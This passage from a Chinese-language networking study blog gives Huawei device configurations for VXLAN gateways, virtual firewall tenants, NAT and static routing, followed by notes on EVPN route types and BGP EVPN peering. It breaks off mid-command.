class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">网关上创建互联vlan</span><br><span class=\"line\">一个vlan绑定到用户的VPN-instance中，用于和用户的vfw实现三层互连</span><br><span class=\"line\">一个vlan绑定到public中，和root防火墙实现三层互联，此链路所有租户共享</span><br><span class=\"line\"></span><br><span class=\"line\">fw上创建互联vlan</span><br><span class=\"line\">一个vlan关联到租户的虚墙，实现和租户在gw上的VPN-instance对接</span><br><span class=\"line\">一个vlan关联root防火墙和gw的public对接</span><br><span class=\"line\"></span><br><span class=\"line\">gw</span><br><span class=\"line\">vlan 10</span><br><span class=\"line\">des vpn A</span><br><span class=\"line\"></span><br><span class=\"line\">vlan 20</span><br><span class=\"line\">des public </span><br><span class=\"line\"></span><br><span class=\"line\">int g1/0/1</span><br><span class=\"line\">p l t </span><br><span class=\"line\">p t a v a </span><br><span class=\"line\"></span><br><span class=\"line\">int vlanif 10</span><br><span class=\"line\">ip add 192.168.10.1 24 </span><br><span class=\"line\">ip bing vpn A</span><br><span class=\"line\"></span><br><span class=\"line\">int vlan 20 </span><br><span class=\"line\">ip add 192.168.20.1 24 </span><br><span class=\"line\"></span><br><span class=\"line\">ip route vpn A 0.0.0.0 0 192.168.10.10</span><br><span class=\"line\"></span><br><span class=\"line\">ip rou 0.0.0.0 0 192.168.30.1</span><br><span class=\"line\"></span><br><span class=\"line\">ip rou 202.1.1.0 24 192.168.20.20</span><br><span class=\"line\"></span><br><span class=\"line\">fw</span><br><span class=\"line\">vlan 10 20</span><br><span class=\"line\">int g1/0/0</span><br><span class=\"line\">portswitch</span><br><span class=\"line\">p l t</span><br><span class=\"line\">p t a v a </span><br><span class=\"line\"></span><br><span class=\"line\">vsys enable</span><br><span class=\"line\">vsys name A</span><br><span class=\"line\">assign vlan 10</span><br><span class=\"line\">int vlanif 10 </span><br><span class=\"line\">ip add 192.168.10.10 24 </span><br><span class=\"line\">service pin p</span><br><span class=\"line\">switch vsys A</span><br><span class=\"line\">firewall zone trust</span><br><span class=\"line\">add interface vlanif 10</span><br><span class=\"line\">//华为NGFW默认出厂存在一个virtual-if0，它属于root的一个逻辑接口，用于和虚拟fw的virtual-if接口实现通信</span><br><span class=\"line\">在创建vfw时，也会为vfw自动创建一个virtual-if接口，接口号设备自行分配</span><br><span class=\"line\">Firewall zone untrust </span><br><span class=\"line\">add inter vitural-if 1</span><br><span class=\"line\"></span><br><span class=\"line\">firewall zone trust  </span><br><span class=\"line\">add inter vit 0</span><br><span class=\"line\"></span><br><span class=\"line\">int vlan 20</span><br><span class=\"line\">ip add 192.168.20.20  24 </span><br><span class=\"line\">service pin p</span><br><span class=\"line\">firewall zon un </span><br><span class=\"line\">add int vlan 20</span><br><span class=\"line\"></span><br><span class=\"line\">switch vsys A </span><br><span class=\"line\">ip route-static 192.168.1.0 24 192.168.10.1</span><br><span class=\"line\">security-po </span><br><span class=\"line\">ru name test </span><br><span class=\"line\">trust-&gt;untrust</span><br><span class=\"line\">sourece 192.168.1.0 </span><br><span class=\"line\">ac pe</span><br><span class=\"line\">ip route 0.0.0.0 0 public</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">security-policy </span><br><span class=\"line\">def ac per</span><br><span class=\"line\">ip route 0.0.0.0 0 192.168.20.1</span><br><span class=\"line\"></span><br><span class=\"line\">nat add A</span><br><span class=\"line\">section 202.1.1.1 202.1.1.10</span><br><span class=\"line\"></span><br><span class=\"line\">vsys name A</span><br><span class=\"line\">assign global 202.1.1.1 202.1.1.10 free</span><br><span class=\"line\"></span><br><span class=\"line\">switch vsys A </span><br><span class=\"line\">nat add A</span><br><span class=\"line\">sec 202.1.1.1 202.1.1.3</span><br><span class=\"line\">nat-policy </span><br><span class=\"line\">ru name A</span><br><span class=\"line\">source-zon  t</span><br><span class=\"line\">de un</span><br><span class=\"line\">source 192.168.1.0 24 </span><br><span class=\"line\">ac so add A </span><br><span class=\"line\"></span><br><span class=\"line\">ip rou 202.1.1.0 28 vpn A</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">R1</span><br><span class=\"line\">ip rou 202.1.1.0 24 192.168.30.1</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230123211745121.png\" alt=\"image-20230123211745121\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.网关双活</span><br><span class=\"line\">[CE1]dis cu </span><br><span class=\"line\">ip vpn-instance A</span><br><span class=\"line\"> ipv4-family</span><br><span class=\"line\">  route-distinguisher 100:1</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\"> vxlan vni 10</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vbdif10</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.1.254 255.255.255.0</span><br><span class=\"line\"> mac-address 5489-9825-6da0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.13.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/2</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 1.1.1.1 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Nve1</span><br><span class=\"line\"> source 1.1.1.1</span><br><span class=\"line\"> vni 10 head-end peer-list 3.3.3.3</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 1.0.0.0</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">[CE3]dis cu </span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\"> vxlan vni 1</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.13.3 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.23.3 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/2</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/2.10 mode l2</span><br><span class=\"line\"> encapsulation untag</span><br><span class=\"line\"> bridge-domain 10</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 3.3.3.3 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Nve1</span><br><span class=\"line\"> source 3.3.3.3</span><br><span class=\"line\"> vni 10 head-end peer-list 1.1.1.1</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 3.0.0.0</span><br><span class=\"line\"> network 10.0.0.0</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//网关双活过墙</span><br><span class=\"line\">[CE1]di cu </span><br><span class=\"line\">vlan batch 10 20 30</span><br><span class=\"line\">#</span><br><span class=\"line\">ip vpn-instance A</span><br><span class=\"line\"> ipv4-family</span><br><span class=\"line\">  route-distinguisher 100:1</span><br><span class=\"line\">#</span><br><span class=\"line\">vlan 10</span><br><span class=\"line\"> description VPN-instance  A</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\"> vxlan vni 10</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vbdif10</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.1.254 255.255.255.0</span><br><span class=\"line\"> mac-address 5489-9825-6da0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vlanif10</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.10.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vlanif20</span><br><span class=\"line\"> description public</span><br><span class=\"line\"> ip address 192.168.20.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.13.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> port link-type trunk</span><br><span class=\"line\"> port trunk allow-pass vlan 2 to 4094</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/2</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 192.168.30.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 1.1.1.1 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Nve1</span><br><span class=\"line\"> source 1.1.1.1</span><br><span class=\"line\"> vni 10 head-end peer-list 3.3.3.3</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 1.0.0.0</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\">#</span><br><span class=\"line\">ip route-static 0.0.0.0 0.0.0.0 192.168.30.30</span><br><span class=\"line\">ip route-static 202.1.1.0 255.255.255.0 192.168.20.20</span><br><span class=\"line\">ip route-static vpn-instance A 0.0.0.0 0.0.0.0 192.168.10.10</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[USG6000V1]dis cu </span><br><span class=\"line\">vlan batch 10 20 30</span><br><span class=\"line\">#</span><br><span class=\"line\">vsys enable</span><br><span class=\"line\">#</span><br><span class=\"line\">vsys name A 1</span><br><span class=\"line\"> assign vlan 10</span><br><span class=\"line\"> assign global-ip 201.1.1.1 202.1.1.10 free</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vlanif10</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.10.10 255.255.255.0</span><br><span class=\"line\"> service-manage ping permit</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vlanif20</span><br><span class=\"line\"> ip address 192.168.20.20 255.255.255.0</span><br><span class=\"line\"> service-manage ping permit</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet1/0/0</span><br><span class=\"line\"> portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> port link-type trunk</span><br><span class=\"line\"> port trunk allow-pass vlan 2 to 4094</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone trust</span><br><span class=\"line\"> set priority 85</span><br><span class=\"line\"> add interface GigabitEthernet0/0/0</span><br><span class=\"line\"> add interface Virtual-if0</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone untrust</span><br><span class=\"line\"> set priority 5</span><br><span class=\"line\"> add interface Vlanif20</span><br><span class=\"line\">#</span><br><span class=\"line\">ip route-static 0.0.0.0 0.0.0.0 192.168.20.1</span><br><span class=\"line\">ip route-static 202.1.1.0 255.255.255.240 vpn-instance A</span><br><span class=\"line\">#</span><br><span class=\"line\">security-policy</span><br><span class=\"line\"> default action permit</span><br><span class=\"line\"> rule name test</span><br><span class=\"line\">#</span><br><span class=\"line\">switch vsys A</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vlanif10</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.10.10 255.255.255.0</span><br><span class=\"line\"> service-manage ping permit</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone trust</span><br><span class=\"line\"> set priority 85</span><br><span class=\"line\"> add interface Vlanif10</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone untrust</span><br><span class=\"line\"> set priority 5</span><br><span class=\"line\"> add interface Virtual-if1</span><br><span class=\"line\">#</span><br><span class=\"line\">nat address-group A 0</span><br><span class=\"line\"> mode pat</span><br><span class=\"line\"> section 0 202.1.1.1 202.1.1.3</span><br><span class=\"line\">#</span><br><span class=\"line\">security-policy</span><br><span class=\"line\"> rule name test</span><br><span class=\"line\">  source-zone trust</span><br><span class=\"line\">  destination-zone untrust</span><br><span class=\"line\">  source-address 192.168.1.0 mask 255.255.255.0</span><br><span class=\"line\">  action permit</span><br><span class=\"line\">#</span><br><span class=\"line\">nat-policy</span><br><span class=\"line\"> rule name A</span><br><span class=\"line\">  source-zone trust</span><br><span class=\"line\">  destination-zone untrust</span><br><span class=\"line\">  source-address 192.168.1.0 mask 255.255.255.0</span><br><span class=\"line\">  action source-nat address-group A</span><br><span class=\"line\">#</span><br><span class=\"line\">ip route-static 0.0.0.0 0.0.0.0 public</span><br><span class=\"line\">ip route-static 192.168.1.0 255.255.255.0 192.168.10.1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[R1]dis cu</span><br><span class=\"line\">[V200R003C00]</span><br><span class=\"line\">interface GigabitEthernet0/0/0</span><br><span class=\"line\"> ip address 192.168.30.30 255.255.255.0 </span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 8.8.8.8 255.255.255.255 </span><br><span class=\"line\">#</span><br><span class=\"line\">ip route-static 202.1.1.0 255.255.255.0 192.168.30.1</span><br></pre></td></tr></table></figure>\n<h2 id=\"evpn\"><a class=\"markdownIt-Anchor\" href=\"#evpn\">#</a> EVPN</h2>\n<p>EVPN 作为数据中心 VXLAN 技术的控制平面，转发平面还是采用 VXLAN 对数据进行封装</p>\n<p>EVPN 支持集中式网关组网，也支持分布式网关组网</p>\n<p>EVPN 在数据中心实现同子网互访和跨子网互访</p>\n<p>为了在数据中心支持 VXLAN。EVPN 在 BGP 协议的基础上新增了一种 NLRI，称为 EVPN NLRI</p>\n<p>EVPN NLRI 定义了三种路由信息</p>\n<p>1.type 2 路由称为 MAC/IP 路由，根据不同的作用，也称为 ARP 路由 / IRB 路由（IRB  集成的路由与桥接），用于</p>\n<p>@数据中心支持 ARP 广播抑制</p>\n<p>@动态虚拟机迁移</p>\n<p>@虚拟机主机路由的发布，实现跨子网互访</p>\n<p>2.type 3 路由，称为集成组播路由，用于在 VTEP 之间动态建立 VXLAN 隧道，并动态实现头端复制列表的生成，用于支持 BUM 报文的转发</p>\n<p>3.type 5 路由，称为前缀路由，常用于将数据中心外部路由引入到各租户的 VPN-instance 中，实现数据中心内部访问外部</p>\n<p>另外标准的 EVPN 协议还定义了 type 1 的路由</p>\n<p>type 1 路由 Ethernet AD Route    (auto discovery)</p>\n<p>双归场景下用于防环快速收敛，别名</p>\n<p>type 4 路由，Ethernet Segment Route</p>\n<p>双归场景下用于实现 DF 的选举和执行负载分担的维护</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//CE1-CE4之间建立EVPN邻居</span><br><span class=\"line\">CE1</span><br><span class=\"line\">evpn-overlay enable </span><br><span class=\"line\">bgp 100</span><br><span class=\"line\">peer 2.2.2.2 as 100</span><br><span class=\"line\">peer 2.2.2.2 con l 0 </span><br><span class=\"line\">peer 3.3.3.3</span><br><span class=\"line\">peer 4.4.4.4</span><br><span class=\"line\">l2vpn-fa evpn </span><br><span class=\"line\">peer 2.2.2.2 enable</span><br><span class=\"line\">peer 2.2.2.2 re</span><br><span class=\"line\">peer 3.3.3.3 </span><br><span class=\"line\">peer 4.4.4.4</span><br><span class=\"line\">//peer 2.2.2.2 ad arp</span><br><span class=\"line\">//peer 3.3.3.3 ad arp</span><br><span class=\"line\">//peer 4.4.4.4 ad arp</span><br><span class=\"line\">undo p v</span><br><span class=\"line\"></span><br><span class=\"line\">CE2</span><br><span class=\"line\">evpn-overlay enable </span><br><span class=\"line\">bgp 100</span><br><span class=\"line\">peer 1.1.1.1 as 100</span><br><span class=\"line\">peer 1.1.1.1 con l 0 </span><br><span class=\"line\">l2vpn-fa evpn </span><br><span class=\"line\">peer 1.1.1.1 en</span><br><span class=\"line\">//peer 1.1.1.1 ad arp</span><br><span class=\"line\"></span><br><span class=\"line\">dis bgp evpn peer </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CE2-CE3-CE4</span><br><span class=\"line\">BD 10</span><br><span class=\"line\">vx  10</span><br><span class=\"line\">evpn</span><br><span class=\"line\">router- 100:1</span><br><span class=\"line\">vpn-t 100:1 b</span><br><span class=\"line\"></span><br><span class=\"line\">int g1/0/1.10 </span><br><span class=\"line\">bd 10</span><br><span class=\"line\">enca 10</span><br><span class=\"line\">//EVPN实例中本地的每个BD域都可以看成是一个独立的EVPN实例，一个二层的广播域</span><br><span class=\"line\"></span><br><span class=\"line\">int Nve1</span><br><span class=\"line\">source 2.2.2.2</span><br><span class=\"line\">vni 10 head peer pro bgp    //type3</span><br><span class=\"line\">dis bgp evpn rout in 0:32:2.2.2.2</span><br><span class=\"line\"></span><br><span class=\"line\">CE4</span><br><span class=\"line\">int vbdif 10</span><br><span class=\"line\">ip add 192.168.1.254 24 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">没有反射器的场景需要在所有节点建立全互联EVPN</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CE2-CE3</span><br><span class=\"line\">ip vpn- A</span><br><span class=\"line\">router 100:1</span><br><span class=\"line\">vpn 100:1 both evpn</span><br><span class=\"line\">vxlan vni 100   //三层VNI</span><br><span class=\"line\"></span><br><span class=\"line\">int vbdif 10</span><br><span class=\"line\">ip bin vpn A</span><br><span class=\"line\">arp dist enable</span><br><span class=\"line\">arp collect host enable</span><br><span class=\"line\">ip addr</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>Type3 路由 ——Inclusive Multicast 路由</strong><br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230125212349933.png\" alt=\"image-20230125212349933\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230125212635735.png\" alt=\"image-20230125212635735\"></p>\n<p>还会携带 ERT，不在 EVPN 中，在 BGP 中，用于设置感兴趣路由</p>\n<p>1. 对方收到 type3 路由后，比较 RT 是否匹配，如果匹配则接收该 type3 的路由</p>\n<p>2. 提取 type3 中 org router ip (VTEP 地址) ，如果该地址路由可达，则创建 VXLAN 隧道</p>\n<p>3. 提取 PMSI 属性中二层 VNI 值，看是否和本端 EVPN 实例中的相同，如果相同则将 PSMI 中携带的 VTEP 地址添加到 VXLAN 隧道的头端复制列表中</p>\n<p>如果希望在 EVPN 邻居之间传递 type2 的路由 (ARP 路由 / IRB 路由)</p>\n<p>peer 1.1.1.1 advertise 